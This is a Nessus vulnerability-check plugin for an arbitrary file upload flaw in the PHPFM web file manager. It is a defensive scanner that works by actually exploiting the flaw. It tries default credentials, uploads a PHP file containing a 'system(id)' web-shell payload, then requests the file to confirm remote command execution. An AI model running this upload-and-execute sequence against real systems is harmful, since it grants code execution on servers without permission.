#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is prone to an
arbitrary file upload vulnerability. 

Description :

The remote host appears to be running PHPFM, a web-based file manager
written in PHP. 

The version of PHPFM installed on the remote host allows anyone to
upload arbitrary files and then to execute them subject to the
privileges of the web server user id. 

See also :

http://www.securityfocus.com/archive/1/415986/30/0/threaded

Solution :

Set 'AllowUpload' to false in 'conf/config.inc.php' or restrict access
to trusted users. 

Risk factor :

Medium / CVSS Base Score : 4.1
(AV:R/AC:L/Au:R/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(20169);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-4423");
  script_bugtraq_id(15335);

  script_name(english:"PHPFM Arbitrary File Upload Vulnerability");
  script_summary(english:"Checks for arbitrary file upload vulnerability in PHPFM");
 
  script_description(english:desc);
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/phpfm", "/files", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Make sure it's PHPFM.
  req = http_get(item:string(dir, "/index.php?&&path=&action=upload"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it is...
  if ("<title>PHPFM" >< res) {
    # Upload a file that runs a system command.
    file = string(rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789"), ".php");
    boundary = SCRIPT_NAME;
    req = string(
      "POST ", dir, "/?&&output=upload&upload=true HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
      # nb: we'll add the Content-Length header and post data later.
    );
    boundary = string("--", boundary);
    # If we're asked to authenticate, use the default username / password.
    if ("input name='input_username'" >< res) {
      postdata = string(
        boundary, "\r\n",
        'Content-Disposition: form-data; name="input_username"', "\r\n",
        "\r\n",
        "username\r\n",

        boundary, "\r\n",
        'Content-Disposition: form-data; name="input_password"', "\r\n",
        "\r\n",
        "password\r\n"
      );
    }
    else postdata = "";

    postdata = string(
      postdata,

      boundary, "\r\n",
      'Content-Disposition: form-data; name="path"', "\r\n",
      "\r\n",
      "\r\n",

      boundary, "\r\n",
      'Content-Disposition: form-data; name="submit"', "\r\n",
      "\r\n",
      "Upload\r\n",

      boundary, "\r\n",
      'Content-Disposition: form-data; name="userfile[]"; filename="', file, '"', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      # nb: try to run 'id'.
      "<? system(id); ?>\r\n",

      boundary, "--", "\r\n"
    );
    req = string(
      req,
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # Now try to run the command.
    req = http_get(item:string(dir, "/", file), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if...
    if (
      # the output looks like it's from id or...
      egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res) ||
      # PHP's disable_functions prevents running system().
      egrep(pattern:"Warning.+\(\) has been disabled for security reasons", string:res)
    ) {
      if (report_verbosity > 0) {
        report = string(
          desc,
          "\n\n",
          "Plugin output :\n",
          "\n",
          "Nessus was able to execute the command 'id' on the remote host;\n",
          "the output was:\n",
          "\n",
          res
        );
      }
      else report = desc;

      security_warning(port:port, data:report);
      exit(0);
    }
  }
}
